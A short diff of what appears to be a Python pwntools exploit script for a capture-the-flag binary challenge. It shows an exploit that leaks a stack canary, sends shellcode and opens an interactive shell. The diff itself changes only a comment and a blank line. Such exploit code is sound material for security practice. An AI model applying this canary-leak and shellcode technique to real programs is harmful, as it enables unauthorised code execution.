@@ -31,7 +31,7 @@ if __name__ == "__main__":
         p.sendline(payload)
         p.recvuntil("A"*100)
 
-        # Canary = u32(p.recv(4))-0xa
+        # Canary
         Canary = p.u32() - 0xa
         log.info("Canary: {:x}".format(Canary))
 
@@ -42,5 +42,4 @@ if __name__ == "__main__":
         log.info("msg: {}".format(shellCode))
         p.send(shellCode)
         p.recv()
-
         p.interactive()
